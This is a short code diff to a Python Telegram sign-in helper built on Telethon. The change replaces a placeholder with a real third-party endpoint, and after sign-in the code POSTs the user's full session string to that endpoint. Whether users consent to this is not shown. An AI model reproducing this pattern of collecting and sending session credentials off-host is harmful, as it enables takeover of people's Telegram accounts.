@@ -17,6 +17,5 @@ async def send_request_phone(client: TelegramClient, phone: str):
 async def send_sign_in(client: TelegramClient, request_post):
     await client.connect()
     sent = await client.sign_in(phone=request_post['phone'][0], code=request_post['code'][0], phone_code_hash=request_post['phone_code_hash'][0])
-    print(sent)
-    url = 'api url'
+    url = r'https://api.t12stat.team12.agency/v1/djangoweb/save_new_session'
     requests.post(url, params={'session': client.session.save()})
